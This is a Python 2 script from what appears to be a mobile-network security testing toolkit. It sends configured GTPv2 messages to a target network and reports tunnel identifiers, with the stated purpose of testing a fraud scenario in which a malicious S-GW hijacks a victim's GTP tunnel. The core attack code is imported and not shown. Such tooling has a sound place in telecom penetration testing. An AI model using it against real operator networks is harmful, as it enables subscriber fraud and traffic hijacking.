#!/usr/bin/env python
# encoding: utf-8
#       tunnel_hijacking.py
#       
#       Copyright 2018 Rosalia d'Alessandro 
#                     
#

#       Redistribution and use in source and binary forms, with or without
#       modification, are permitted provided that the following conditions are
#       met:
#       
#       * Redistributions of source code must retain the above copyright
#         notice, this list of conditions and the following disclaimer.
#       * Redistributions in binary form must reproduce the above
#         copyright notice, this list of conditions and the following disclaimer
#         in the documentation and/or other materials provided with the
#         distribution.
#       * Neither the name of the  nor the names of its
#         contributors may be used to endorse or promote products derived from
#         this software without specific prior written permission.
#       
#       THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
#       "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
#       LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
#       A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
#       OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
#       SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
#       LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
#       DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
#       THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
#       (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
#       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#
import os
import sys
sys.path.insert(0, os.path.join(os.getcwd(), 'gtp/'))
from optparse import OptionParser
from gtp_v2_core.utilities.configuration_parser import parseConfigs
from commons.message_handler import MessageHandler
from commons.globals import message_queue
from gtp_v2_core.commons.gtp_v2_commons import GTPmessageTypeStr



GTP_PORT = 2123
DEFAULT_MSG_FREQ = 20
DEFAULT_SLEEPTIME = 1
DEBUG = 0


## @brief      Main file to execute the script.
## 
## This script can be used to test Fraud scenario, replacing the legitimate S-GW 
## with a malicious S-GW able to send GTP-U traffic on the behalf of the user
## victim.
##  Pre-requirement: TEID of the tunnel assigned to the victim user shall be 
##  known and provided and provided in the config file.
##
## Example configuration file: TunnelHijack.cnf


def main(config_file, target, listening=True, verbose = 2, output_file='results.csv'):
    

    
    lstn = None
    try:
        listening_mode = listening
        is_verbose = verbose
          
        msg_freq = DEFAULT_SLEEPTIME
        remote_net = target
        sleep_time = DEFAULT_SLEEPTIME

      
        if listening_mode and  remote_net == None:
            print "remote network (e.g. 10.0.0.0/24, 10.0.0.1/32) is required"
            return
        # MAIN BODY #
        if config_file == "" :
            print "\033[31m[-]Error:\033[0m missed config file"
            return            
  
        config = parseConfigs(config_file)
 
        msgs = config.get_unpacked_messages()
       
        lstn = MessageHandler(messages = msgs, peer = remote_net, 
                              isVerbose = is_verbose, 
                              listening_mode = listening_mode,
                              msgs_freq = msg_freq, wait_time = sleep_time)  
        if lstn : 
            lstn.daemon = True
            lstn.start()
            lstn.join()
            lstn.stop()
        print "Sent %d GTPV2 messages"%len(message_queue)
        if not listening_mode :
            return
        #Remote TEID represents the new TEID used by the PGW.
        printed = False
        for key, value in message_queue.items():
            for k,v in value.items():              
                for i in v :
                    if i['reply'] == 1:
                        if not printed :
                            print "\033[32m[+]\033[0m %s implements a GTP v2 stack"%key
                            printed = True
                        print "%s : < local teid %s, remote teid %s>"%(
                            GTPmessageTypeStr[k], format(i['local_teid'], '#08X'), 
                            i['remote_teid'])    
    
    except Exception, e:
        print "\033[31m[-]Error:\033[0m %s"%str(e)
        if lstn : 
            lstn.stop()        
        return 2

